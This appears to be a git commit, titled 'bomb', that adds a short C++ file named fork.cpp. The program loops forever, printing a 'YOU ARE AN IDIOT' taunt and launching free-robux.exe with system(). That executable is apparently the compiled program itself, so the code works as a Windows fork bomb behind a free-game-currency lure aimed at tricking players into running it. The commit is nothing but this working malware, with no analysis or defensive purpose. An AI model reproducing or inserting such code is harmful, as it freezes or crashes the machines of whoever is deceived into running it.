203841d057a34b8530707ebcd960eaa939e6051d
GoldenStarGamer <vicentetavareslima@gmail.com>
2022-06-03 15:39:32 +0100

    bomb

---
+++ fork.cpp
@@ -0,0 +1,12 @@
+#include <stdio.h>
+#include <iostream>
+
+int main()
+{
+    while(true)
+    {
+        printf("YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT");
+        system("start /D %CD% /MAX free-robux.exe");
+    }
+    return 0;
+}
